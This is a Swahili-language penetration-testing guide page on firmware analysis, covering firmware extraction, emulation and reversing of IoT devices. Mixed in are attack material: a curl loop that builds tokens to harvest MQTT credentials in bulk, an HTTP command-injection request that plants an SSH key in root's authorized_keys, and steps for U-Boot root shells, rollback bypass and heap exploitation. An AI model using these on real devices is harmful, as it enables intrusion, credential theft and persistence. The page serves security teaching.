# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji huingiliana nayo. Huhifadhiwa kwenye memory ya kudumu, hivyo kuhakikisha kifaa kinaweza kufikia maelekezo muhimu tangu kinapowashwa, na kusababisha mfumo wa uendeshaji kuanzishwa. Kuchunguza na uwezekano wa kurekebisha firmware ni hatua muhimu katika kubaini udhaifu wa kiusalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Muundo wa CPU na mfumo wa uendeshaji unaoendesha
- Maelezo ya bootloader
- Muundo wa hardware na datasheets
- Vipimo vya codebase na maeneo ya source
- External libraries na aina za leseni
- Historia za updates na certifications za udhibiti
- Michoro ya architecture na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, kama ilivyo uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya manual na automated review. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis bila malipo ambayo inaweza kutumika kutafuta matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka kwa chanzo (developers, manufacturers)
- **Kui-build** kwa kutumia maelekezo yaliyotolewa
- **Ku-download** kutoka kwenye tovuti rasmi za support
- Kutumia queries za **Google dork** kutafuta mafaili ya firmware yaliyohostiwa
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukatiza **updates** kwa kutumia mbinu za man-in-the-middle
- **Kuextract** kutoka kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kusniff** maombi ya updates ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Kudump** kutoka kwenye bootloader au network
- **Kuondoa na kusoma** chip ya storage, ikiwa njia nyingine zote zimeshindikana, kwa kutumia hardware tools zinazofaa

### Logs za UART pekee: lazimisha root shell kupitia U-Boot env kwenye flash

Ikiwa UART RX inapuuzwa (logs pekee), bado unaweza kulazimisha init shell kwa **kuhariri U-Boot environment blob** offline:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Tafuta partition ya U-Boot env, hariri `bootargs` ili ijumuishe `init=/bin/sh`, na **ukokotoe upya U-Boot env CRC32** ya blob.
3. Flash tena env partition pekee na uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye embedded devices ambako bootloader shell imezimwa lakini env partition inaweza kuandikwa kupitia external flash access.

## Kuchanganua firmware

Sasa kwa kuwa **una firmware**, unahitaji kuextract taarifa kuihusu ili kujua jinsi ya kuishughulikia. Kuna tools mbalimbali unazoweza kutumia kwa hilo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ikiwa hutapata mengi kwa kutumia tools hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, basi haiwezekani kuwa ime-encryptiwa. Ikiwa entropy ni kubwa, kuna uwezekano ime-encryptiwa (au ime-compressiwa kwa njia fulani).

Zaidi ya hayo, unaweza kutumia tools hizi kutoa **files zilizofichwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Kupata Filesystem

Kwa kutumia tools zilizotajwa awali kama `binwalk -ev <bin>`, ulipaswa kuwa umeweza **kutoa filesystem**.\
Kwa kawaida Binwalk huiondoa ndani ya **folder lililopewa jina la aina ya filesystem**, ambalo kwa kawaida ni mojawapo ya yafuatayo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Filesystem Manually

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya filesystem na carve filesystem iliyocompressiwa** kutoka kwenye binary, kisha **utoe filesystem manually** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha **dd command** ifuatayo kwa kuchonga mfumo wa faili wa Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa katika directory ya "`squashfs-root`" baadaye.

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystems za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystems za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua kwa kina ili kuelewa muundo wake na vulnerabilities zinazoweza kuwepo. Mchakato huu unahusisha kutumia tools mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye firmware image.

### Tools za Awali za Uchambuzi

Seti ya commands imetolewa kwa ukaguzi wa awali wa binary file (inayorejelewa kama `<bin>`). Commands hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua binary data, na kuelewa maelezo ya partition na filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya **encryption** ya image, **entropy** hukaguliwa kwa `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa encryption, huku entropy ya juu ikiashiria uwezekano wa encryption au compression.

Kwa kutoa **embedded files**, tools na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili zinapendekezwa.

### Kutoa Filesystem

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa filesystem, mara nyingi kwenye directory iliyopewa jina kulingana na aina ya filesystem (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya filesystem kwa sababu ya kukosekana kwa magic bytes, extraction ya manual huhitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya filesystem, kisha kutumia command ya `dd` ku-carve filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya mfumo wa faili (kwa mfano, squashfs, cpio, jffs2, ubifs), commands tofauti hutumika kutoa maudhui manually.

### Uchambuzi wa Mfumo wa Faili

Baada ya mfumo wa faili kutolewa, utafutaji wa security flaws huanza. Huzingatiwa network daemons zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, functionalities za update server, code ambayo haijacompile, startup scripts, na compiled binaries kwa ajili ya offline analysis.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa ajili ya user credentials
- SSL certificates na keys katika **etc/ssl**
- Configuration na script files kwa vulnerabilities zinazoweza kuwepo
- Embedded binaries kwa ajili ya analysis zaidi
- Web servers na binaries za kawaida za vifaa vya IoT

Tools kadhaa husaidia kufichua taarifa nyeti na vulnerabilities ndani ya mfumo wa faili:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa utafutaji wa taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa static na dynamic analysis

### Ukaguzi wa Usalama kwenye Compiled Binaries

Source code na compiled binaries zote zinazopatikana kwenye mfumo wa faili lazima zichunguzwe kwa vulnerabilities. Tools kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa vibaya.

## Kukusanya cloud config na MQTT credentials kupitia URL tokens zilizotokana na data nyingine

IoT hubs nyingi hupakua per-device configuration kutoka cloud endpoint inayoonekana kama:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa firmware analysis unaweza kugundua kwamba `<token>` inatengenezwa locally kutoka kwa device ID kwa kutumia hardcoded secret, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na huwakilishwa kama uppercase hex

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kujenga upya URL na kuvuta cloud config, ambayo mara nyingi hufichua MQTT credentials zilizo katika plaintext na topic prefixes.

Practical workflow:

1) Toa deviceId kutoka kwenye UART boot logs

- Unganisha 3.3V UART adapter (TX/RX/GND) na capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha muundo wa URL ya cloud config na anwani ya broker, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Rejesha STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (k.m., MD5(deviceId||STATIC_KEY)).
- Tengeneza token katika Bash na ubadilishe digest iwe herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kusanya cloud config na MQTT credentials

- Tunga URL na pakua JSON kwa curl; ichanganue kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya plaintext MQTT na ACLs dhaifu za topics (ikiwa zipo)

- Tumia credentials zilizopatikana kusubscribe kwenye maintenance topics na kutafuta matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Orodhesha device IDs zinazoweza kutabirika (kwa kiwango kikubwa, kwa idhini)

- Ecosystem nyingi hujumuisha OUI/vendor, product/type bytes zikifuatiwa na suffix ya mfululizo.
- Unaweza kupitia candidate IDs, kuunda tokens na kuchukua configs kwa njia ya programmatic:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Daima pata idhini ya wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kurejesha secrets bila kubadilisha target hardware inapowezekana.


Mchakato wa ku-emulate firmware huwezesha **dynamic analysis** ya uendeshaji wa kifaa au wa programu binafsi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au dependencies za architecture, lakini kuhamisha root filesystem au binaries mahususi kwenye kifaa chenye architecture na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyotengenezwa awali, kunaweza kuwezesha testing zaidi.

### Ku-emulate Binaries Binafsi

Kwa kuchunguza program moja, ni muhimu kutambua endianness na CPU architecture ya program hiyo.

#### Mfano wa MIPS Architecture

Ili ku-emulate binary ya MIPS architecture, unaweza kutumia command:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana muhimu za uigaji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` hutumiwa, na kwa binaries za little-endian, `qemu-mipsel` ndiyo chaguo.

#### Uigaji wa ARM Architecture

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji wa Mfumo Mzima

Tools kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, huwezesha uigaji kamili wa firmware, hu-automate mchakato na kusaidia katika dynamic analysis.

## Dynamic Analysis kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilichoigwa hutumiwa kwa analysis. Ni muhimu kudumisha shell access kwenye OS na filesystem. Uigaji huenda usiige kikamilifu mwingiliano wa hardware, hivyo kuhitaji kuanzisha upya uigaji mara kwa mara. Analysis inapaswa kuchunguza tena filesystem, kutumia webpages na network services zilizo wazi, na kuchunguza vulnerabilities za bootloader. Majaribio ya integrity ya firmware ni muhimu ili kutambua vulnerabilities zinazoweza kusababishwa na backdoor.

## Mbinu za Runtime Analysis

Runtime analysis inahusisha kuingiliana na process au binary katika mazingira yake ya uendeshaji, kwa kutumia tools kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kutambua vulnerabilities kupitia fuzzing na mbinu nyingine.

Kwa embedded targets zisizo na debugger kamili, **nakili `gdbserver` iliyounganishwa statically** kwenye kifaa na uiunganishe remotely:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Uchoraji wa ramani wa ujumbe wa Zigbee / radio-co-processor

Kwenye IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Workflow muhimu ni kuchora ramani ya njia:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text or TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda targets mbili za reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, tambua:

- **message groups** na dispatch tables
- Ni ujumbe upi unaweza kutoka kwenye **network** dhidi ya kutoka kwa controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinapatikana tu wakati wa **commissioning**, discovery, au firmware/model download phases

Kwa Zigbee hasa, capture pairing traffic na uangalie ikiwa target bado inategemea **Link Key** ya kawaida `ZigBeeAlliance09`. Ikiwa ndivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza ufichuaji huu, kwa hivyo tambua ikiwa kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na FSM-gated reachability

Vendor-specific Zigbee/ZCL commands mara nyingi huwa target bora kuliko standardized clusters kwa sababu hupeleka data kwenye **custom parsing code** na **FSMs** zenye validation iliyojaribiwa kidogo.<sup>[[8]](#references)</sup>

Workflow ya vitendo:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Rejesha **FSM state**, **event**, **check**, **action**, na **next-state** tables.
- Tambua **transitional states** zinazoendelea kiotomatiki, pamoja na retry/error branches ambazo hatimaye hu-reset au kuachilia attacker-controlled state.
- Thibitisha ni exchanges zipi halali za protocol zinazohitajika kuiweka daemon kwenye state iliyo hatarini badala ya kudhani kuwa buggy handler inapatikana kila wakati.

Kwa protocols zinazotegemea timing, packet replay kutoka Python framework inaweza kuwa polepole sana. Njia yenye kuaminika zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia vendor-grade stack, ili uweze kufichua **endpoints**, **attributes**, na commissioning timing sahihi.

### Aina ya hitilafu ya fragmented-download kwenye embedded daemons

Aina ya hitilafu inayojirudia kwenye firmware hutokea katika **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragments zinazofuata huthibitisha tu sehemu za **packet-local** zinazodhibitiwa na attacker, kama `packet_total_size >= offset + chunk_len`.
3. Copy hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia dhidi ya **original allocated size**.

Hii humwezesha attacker kutuma:

- Fragment ya kwanza halali yenye **small** declared total size ili kulazimisha heap allocation ndogo.
- Fragment inayofuata yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Forged packet-local size inayotimiza checks mpya huku bado ikifurika buffer iliyotengwa awali.

Wakati vulnerable path iko nyuma ya commissioning logic, exploitation lazima ijumuisha **device emulation** ya kutosha kuiendesha target hadi kwenye model-download au blob-download state inayotarajiwa kabla ya kutuma fragments zilizoharibika.

### Protocol-driven `free()` triggers

Kwenye embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si "kusubiri cleanup", bali **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma follow-up fragments zilizoharibika ili kusukuma FSM kwenye **retry** au **error** states.
- Vuka retry threshold ili daemon **ireset context** na kuachilia buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kuchochea allocator-side primitives kabla process haija-crash kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators za **musl/uClibc/dlmalloc-like** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Pattern thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks** zilizowekwa ndani ya buffer iliyofurika, badala ya kufuta mara moja bin pointers halisi na kusababisha process ku-crash.

## Binary Exploitation na Proof-of-Concept

Kutengeneza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa target architecture na programming katika lower-level languages. Binary runtime protections kwenye embedded systems ni nadra, lakini zinapokuwepo, techniques kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Maelezo ya uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Large allocation ya baadaye inaweza kuchochea `__malloc_consolidate()`, kwa hivyo fake chunk yoyote lazima ipite checks (size salama, `fd = 0`, na chunks zinazozunguka zionekane kuwa "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries chini ya ASLR:** ikiwa ASLR imewezeshwa lakini main binary ni **non-PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na valid heap chunk header ili kupeleka fastbin allocation kwenye **function pointer table**.
- **Parser-stopping NUL:** JSON inapoparsiwa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikiweka trailing attacker-controlled bytes kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayopiga `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka executable shellcode kwenye known mapping na kurukia humo.

## Prepared Operating Systems kwa Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa environments zilizosanidiwa awali kwa firmware security testing, zikiwa na tools zinazohitajika.

## Prepared OSs za kuchambua Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Huokoa muda mwingi kwa kutoa environment iliyosanidiwa awali yenye tools zote zinazohitajika tayari zimepakiwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system inayotegemea Ubuntu 18.04 na ikiwa na firmware security testing tools zilizopakiwa awali.

## Firmware Downgrade Attacks na Insecure Update Mechanisms

Hata vendor anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi huachwa**. Wakati boot- au recovery-loader inathibitisha tu signature kwa kutumia embedded public key lakini hailinganishi *version* (au monotonic counter) ya image inayoflashiwa, attacker anaweza kusakinisha kihalali **older, vulnerable firmware ambayo bado ina valid signature**, na hivyo kurudisha vulnerabilities zilizokuwa zimepatchiwa.<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Pata older signed image**
* Ichukue kutoka vendor’s public download portal, CDN au support site.
* I-extract kutoka companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* Iipate kutoka third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Upload au serve image kwenye device** kupitia update channel yoyote iliyo wazi:
* Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
* Consumer IoT devices nyingi hufichua *unauthenticated* HTTP(S) endpoints zinazokubali Base64-encoded firmware blobs, huzidecode upande wa server na kuchochea recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability iliyopatchiwa kwenye release mpya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari, flash image ya hivi karibuni tena au disable updates ili kuepuka detection baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo hatarini (iliyofanyiwa downgrade), parameter ya `md5` inaunganishwa moja kwa moja kwenye shell command bila sanitisation, hivyo kuruhusu injection ya commands kiholela (hapa — kuwezesha root access inayotegemea SSH key). Toleo za baadaye za firmware zilianzisha character filter ya msingi, lakini kutokuwepo kwa downgrade protection kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kwenye Mobile Apps

Vendor wengi hujumuisha full firmware images ndani ya companion mobile applications zao ili app iweze ku-update device kupitia Bluetooth/Wi-Fi. Packages hizi kwa kawaida huhifadhiwa bila encryption kwenye APK/APEX chini ya paths kama `assets/fw/` au `res/raw/`. Tools kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuruhusu kutoa signed images bila kugusa hardware halisi.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass ya anti-rollback ya updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutumia **ratchet** ya anti-downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano routine ya UDS kupitia CAN, recovery command, au userspace OTA agent). Ikiwa **bootloader** baadaye hukagua tu signature/CRC ya image na kuamini partition table au slot metadata, ulinzi wa rollback bado unaweza kubypass.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Firmware metadata ina version descriptor pamoja na **security ratchet** / monotonic counter.
- Updater inalinganisha image ratchet na thamani iliyohifadhiwa kwenye persistent storage na kukataa signed images za zamani.
- **Bootloader** haisomi ratchet hiyo na inathibitisha tu header, CRC, na signature kabla ya kuwasha slot iliyochaguliwa.
- Slot activation huhifadhiwa kando kwenye partition table au per-slot generation counter na **haijaunganishwa cryptographically** na firmware digest halisi iliyothibitishwa.

Hii hutengeneza primitive ya **validate-one-image / boot-another-image** katika dual-slot systems. Ikiwa attacker anaweza kuifanya updater itambue slot B kama lengo linalofuata la boot kwa kutumia current signed image, na baadaye akaandika upya slot B kabla ya reboot, bootloader bado inaweza kuwasha image iliyodowngrade kwa sababu inaamini tu slot metadata ambayo tayari imecommit.

Muundo wa kawaida wa abuse:

1. Upload **current signed** firmware kwenye passive slot na endesha validation/switch routine ya kawaida ili layout itambue slot hiyo kama itakayokuwa active.
2. **Usifanye reboot bado**. Ingia tena kwenye slot-preparation/erase routine katika session hiyo hiyo.
3. Tumia vibaya boot-state au slot-selection logic iliyopitwa na wakati ili updater ifute **physical slot ileile** ambayo ilikuwa imetangazwa hivi karibuni.
4. Andika **older but still signed** firmware kwenye slot hiyo.
5. Ruka validation routine inayotekeleza ratchet na fanya reboot moja kwa moja.
6. Bootloader inachagua slot iliyotangazwa, inathibitisha signature/integrity pekee, na kuwasha image ya zamani.

Mambo ya kutafuta unapofanya reverse ya utekelezaji wa A/B update:

- Slot selection inayotokana na **boot-time flags** ambazo hazijasasishwa baada ya switch iliyofanikiwa.
- Routine ya aina ya `prepare_passive_slot()` inayofuta slot kwa kutegemea state iliyopitwa na wakati badala ya **current committed layout**.
- Function ya aina ya `part_write_layout()` inayoongeza tu **generation counter** / active flag na haihifadhi validated image hash.
- Ratchet checks zilizotekelezwa katika userspace au updater code, lakini **hazipo** kwenye ROM / bootloader / secure boot stages.
- Erase au recovery routines zinazoacha slot ikiwa imetiwa alama kuwa bootable hata baada ya maudhui yake kuondolewa na kuandikwa upya.

### Checklist ya Kutathmini Update Logic

* Je, transport/authentication ya *update endpoint* imelindwa vya kutosha (TLS + authentication)?
* Je, device inalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano signatures hukaguliwa na ROM code)?
* Je, **bootloader inatekeleza ratchet ileile** kama updater, badala ya kukagua signature/CRC pekee?
* Je, slot activation metadata **imefungwa na validated firmware digest/version**, au slot inaweza kubadilishwa baada ya promotion?
* Baada ya slot switch kufanikiwa, je device inalazimishwa kufanya reboot au update/erase routines za baadaye bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, userland code hufanya sanity checks za ziada (kwa mfano allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia tena validation logic ileile?

> 💡  Ikiwa mojawapo ya mambo yaliyo hapo juu haipo, huenda platform iko katika hatari ya rollback attacks.

## Firmware yenye udhaifu kwa ajili ya mazoezi

Ili kufanya mazoezi ya kugundua vulnerabilities katika firmware, tumia miradi ifuatayo ya firmware yenye udhaifu kama mwanzo.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kupata firmware decryption keys kutoka kwenye embedded KMS/Vault state

Update image inapochanganya plaintext metadata ndogo na blob kubwa yenye high entropy, fanya container triage kabla ya kujaribu brute-force yoyote:<sup>[[1]](#references)</sup>

- Dump headers, offsets na line boundaries kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha OpenSSL `enc` format: bytes 8 zinazofuata ni salt na bytes zilizosalia ni ciphertext.
- Base64 field inayodecode hadi kuwa bytes `256` kamili ni dalili kubwa kwamba unaangalia RSA-2048 ciphertext inayofunga random firmware password/session key.
- Detached PGP material katika file hilo hilo mara nyingi hulinda authenticity pekee; usidhani kuwa ndiyo confidentiality mechanism.

Ikiwa static key hunting (`grep`, `strings`, PEM/PGP searches) itashindwa, fanya reverse ya **operational decrypt path** badala ya kutafuta private keys pekee:

